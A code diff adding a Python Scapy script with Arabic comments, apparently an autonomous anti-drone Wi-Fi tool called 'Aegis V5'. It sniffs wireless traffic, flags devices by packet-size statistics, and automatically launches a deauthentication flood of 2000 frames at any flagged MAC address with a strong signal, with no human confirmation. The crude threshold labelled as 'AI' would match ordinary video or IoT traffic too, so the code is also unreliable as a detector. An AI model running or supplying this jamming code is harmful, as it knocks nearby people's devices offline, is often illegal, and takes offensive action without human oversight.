@@ -1,0 +1,77 @@
+import numpy as np # للنواة الحسابية
+from scapy.all import *
+import threading
+import time
+
+class AegisAICore:
+    def __init__(self):
+        # النواة المعرفية: تخزين الأنماط المكتسبة
+        self.threat_patterns = {
+            "burst_video": {"min_len": 1000, "frequency": 0.01}, # بث فيديو
+            "control_link": {"min_len": 60, "max_len": 200, "frequency": 0.05} # أوامر تحكم
+        }
+        self.active_threats = {}
+
+    def analyze_behavior(self, packet_list):
+        """
+        التحليل المستقل: هل السلوك يشبه المسيرة؟
+        (تحليل إحصائي بدلاً من الاعتماد على الاسم فقط)
+        """
+        if len(packet_list) < 5: return False
+        
+        lengths = [len(p) for p in packet_list]
+        avg_len = np.mean(lengths)
+        std_dev = np.std(lengths)
+        
+        # الذكاء الاصطناعي: المسيرات تمتاز بانحراف معياري منخفض في حجم حزم التحكم
+        # واستقرار عالٍ في حزم الفيديو
+        if avg_len > 800 and std_dev < 100:
+            return "AI_CONFIRMED_DRONE_VIDEO"
+        if 60 < avg_len < 300 and std_dev < 50:
+            return "AI_CONFIRMED_DRONE_C2"
+        return None
+
+# --- النظام الهجين المطور ---
+
+def auto_countermeasure(target_mac, interface):
+    """وحدة الرد التلقائي المستقلة"""
+    print(f"⚠️ [AI DECISION] تحييد تلقائي للهدف: {target_mac}")
+    # هجوم Deauth مكثف + حزم تشويش عشوائية (Noise Injection)
+    pkt = RadioTap()/Dot11(addr1=target_mac, addr2=target_mac, addr3=target_mac)/Dot11Deauth(reason=7)
+    sendp(pkt, iface=interface, inter=0.0001, count=2000, verbose=0)
+
+def aegis_v5_autonomous(interface="wlan0mon"):
+    ai_core = AegisAICore()
+    packet_buffer = {} # لتخزين حزم كل جهاز وتحليلها
+
+    def autonomous_callback(pkt):
+        if pkt.haslayer(Dot11):
+            mac = pkt.addr2
+            if not mac: return
+            
+            # إضافة الحزمة للمخزن المؤقت للتحليل
+            if mac not in packet_buffer: packet_buffer[mac] = []
+            packet_buffer[mac].append(pkt)
+            
+            # الاحتفاظ بآخر 20 حزمة فقط للتحليل السريع
+            if len(packet_buffer[mac]) > 20:
+                packet_buffer[mac].pop(0)
+                
+                # استشارة نواة الذكاء الاصطناعي
+                ai_verdict = ai_core.analyze_behavior(packet_buffer[mac])
+                
+                if ai_verdict:
+                    rssi = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else -100
+                    print(f"🤖 [AI CORE] تم رصد نمط معادٍ: {ai_verdict} من {mac} [RSSI: {rssi}]")
+                    
+                    # قرار الرد التلقائي (إذا كانت الإشارة قوية بما يكفي للخطر)
+                    if rssi > -60: 
+                        threading.Thread(target=auto_countermeasure, args=(mac, interface)).start()
+
+    print("🧠 تم تفعيل نواة الذكاء الاصطناعي المستقلة (Aegis V5)")
+    print("🛠️ النظام يعمل الآن بدون الاعتماد على قواعد البيانات التقليدية فقط...")
+    
+    sniff(iface=interface, prn=autonomous_callback, store=0)
+
+# التشغيل
+# aegis_v5_autonomous("wlan0mon")
